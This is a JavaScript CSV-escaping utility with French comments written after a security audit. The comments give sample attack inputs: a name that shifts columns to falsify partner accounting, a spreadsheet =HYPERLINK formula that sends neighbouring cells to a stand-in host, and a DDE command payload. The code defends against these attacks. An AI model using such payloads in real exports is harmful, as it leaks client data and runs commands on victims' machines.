// ═══════════════════════════════════════════════════════════════════════════
// ÉCHAPPEMENT CSV — utilitaire partagé
// ═══════════════════════════════════════════════════════════════════════════
// Deux problèmes distincts, tous deux réels sur ce projet (audit sécurité
// 2026-09), et tous deux alimentés par des champs que L'ATTAQUANT contrôle :
// son propre nom, son e-mail, le titre d'une annonce.
//
// 1. DÉCALAGE DE COLONNES. L'export partenaire concaténait les valeurs par un
//    simple `join(",")`. Un client réservant sous le nom
//        X","",999999,0,0,0,USD,2020-01-01,Oui
//    décalait toute la ligne dans la comptabilité du partenaire : montant,
//    commission, net partenaire, devise et statut « payé » falsifiés dans le
//    fichier même qui lui sert de justificatif.
//
// 2. INJECTION DE FORMULE. Un tableur évalue toute cellule commençant par
//    =, +, -, @, TAB ou CR. Un nom valant
//        =HYPERLINK("https://evil.tld/x?d="&A1&B1,"Ouvrir la facture")
//    exfiltre les cellules voisines (montants, e-mails d'autres clients) dès
//    que le partenaire ou l'admin ouvre le fichier. La variante DDE
//    (=cmd|'/C calc'!A0) va plus loin encore.
//    Préfixer d'une apostrophe force le tableur à traiter la valeur comme du
//    texte, sans altérer ce que l'utilisateur lit.

const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

export function csvCell(value) {
  let str = String(value ?? "");

  // Neutralisation de formule AVANT la mise entre guillemets, pour que
  // l'apostrophe se retrouve bien à l'intérieur de la cellule.
  if (str.length && FORMULA_TRIGGERS.includes(str[0])) {
    str = `'${str}`;
  }

  // Guillemets obligatoires dès qu'un séparateur, un guillemet ou un saut de
  // ligne apparaît ; les guillemets internes sont doublés (RFC 4180).
  if (/["',;\t\n\r]/.test(str) || str !== String(value ?? "")) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

// Construit une ligne CSV complète à partir d'un tableau de valeurs.
export const csvRow = (values) => values.map(csvCell).join(",");
